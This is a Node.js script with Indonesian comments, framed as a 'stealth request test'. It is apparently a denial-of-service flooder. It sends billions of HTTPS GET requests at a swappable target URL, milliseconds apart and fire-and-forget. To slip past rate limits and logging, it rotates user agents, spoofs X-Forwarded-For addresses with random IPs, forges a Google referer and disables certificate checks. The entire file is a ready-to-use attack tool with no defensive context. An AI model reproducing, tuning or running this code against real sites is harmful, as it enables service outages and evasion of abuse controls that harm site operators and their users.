const https = require('https');
const { setTimeout } = require('timers/promises');
const { randomInt, randomBytes } = require('crypto');

// KONFIGURASI
const config = {
  TARGET_URL: 'localhost:3000', // Ganti dengan URL target
  MAX_REQUESTS: 9999999999,
  DELAY_MIN_MS: 5,
  DELAY_MAX_MS: 10,
  RANDOM_USER_AGENTS: [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
  ],
  ACCEPT_HEADERS: [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5'
  ]
};

function getRandomUserAgent() {
  return config.RANDOM_USER_AGENTS[
    randomInt(0, config.RANDOM_USER_AGENTS.length)
  ];
}

function getRandomAcceptHeader() {
  return config.ACCEPT_HEADERS[
    randomInt(0, config.ACCEPT_HEADERS.length)
  ];
}

function getRandomIP() {
  return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(0,255)}`;
}

function getRandomDelay() {
  return randomInt(config.DELAY_MIN_MS, config.DELAY_MAX_MS);
}

function makeRequest(url, requestId) {
  return new Promise((resolve) => {
    const options = {
      hostname: new URL(url).hostname,
      port: 443,
      path: new URL(url).pathname,
      method: 'GET',
      headers: {
        'User-Agent': getRandomUserAgent(),
        'Accept': getRandomAcceptHeader(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.google.com/',
        'X-Forwarded-For': getRandomIP(),
        'Connection': 'keep-alive'
      },
      // Tidak menyimpan cookie
      agent: new https.Agent({ 
        rejectUnauthorized: false,
        keepAlive: true,
        maxSockets: 1
      })
    };

    const start = Date.now();
    const req = https.request(options, (res) => {
      let data = '';
      
      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        const duration = Date.now() - start;
        console.log(`[${requestId}] Status: ${res.statusCode} | Time: ${duration}ms | Size: ${data.length} bytes`);
        resolve({ status: res.statusCode, duration });
      });
    });

    req.on('error', (e) => {
      console.error(`[${requestId}] Error: ${e.message}`);
      resolve({ status: null, error: e.message });
    });

    req.end();
  });
}

async function runStealthTest() {
  console.log('Memulai stealth request test...');
  
  for (let i = 0; i < config.MAX_REQUESTS; i++) {
    const delay = getRandomDelay();
    await setTimeout(delay);
    
    makeRequest(config.TARGET_URL, i+1)
      .then(() => {})
      .catch(() => {});
  }
}

runStealthTest();
